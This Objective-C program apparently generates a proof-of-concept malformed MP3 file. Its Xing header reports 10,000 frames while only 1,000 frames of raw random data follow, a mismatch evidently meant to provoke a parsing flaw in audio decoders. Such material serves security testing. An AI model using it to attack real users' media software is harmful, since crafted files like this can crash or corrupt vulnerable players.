#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        time_t startTime = time(NULL);
        fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

        double sampleRate = 44100.0;
        UInt32 channelNum = 2;
        NSString *fileName = [NSString stringWithFormat:@"output_poc3_var5_%.0f_ch%u.mp3", sampleRate, (unsigned int)channelNum];
        FILE *file = fopen(fileName.UTF8String, "wb");
        if (!file) {
            fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
            return 1;
        }

        // Write Xing header
        UInt32 totalFrames = 10000; // Inflated
        UInt32 actualFrames = 1000;
        char xingHeader[100] = {0};
        memcpy(xingHeader, "Xing", 4);
        xingHeader[7] = 0x01; // Frames field present
        xingHeader[8] = totalFrames >> 24;
        xingHeader[9] = (totalFrames >> 16) & 0xFF;
        xingHeader[10] = (totalFrames >> 8) & 0xFF;
        xingHeader[11] = totalFrames & 0xFF;
        fwrite(xingHeader, 1, sizeof(xingHeader), file);

        // Write dummy MP3 frames (simplified)
        char frameHeader[4] = {0xFF, 0xFB, 0x90, 0x00}; // 44.1kHz, 128kbps, stereo
        float *audioBuffer = (float *)malloc(actualFrames * 1152 * channelNum * sizeof(float));
        for (size_t i = 0; i < actualFrames * 1152 * channelNum; ++i) {
            audioBuffer[i] = ((float)arc4random() / UINT32_MAX) * 2.0f - 1.0f;
        }
        for (UInt32 i = 0; i < actualFrames; ++i) {
            fwrite(frameHeader, 1, sizeof(frameHeader), file);
            fwrite(audioBuffer + (i * 1152 * channelNum), 1, 1152 * channelNum * sizeof(float), file);
        }
        fprintf(stderr, "PoC3 Var5: Xing header with %u frames, actual %u frames\n", totalFrames, actualFrames);

        fclose(file);
        free(audioBuffer);

        time_t endTime = time(NULL);
        fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
    }
    return 0;
}
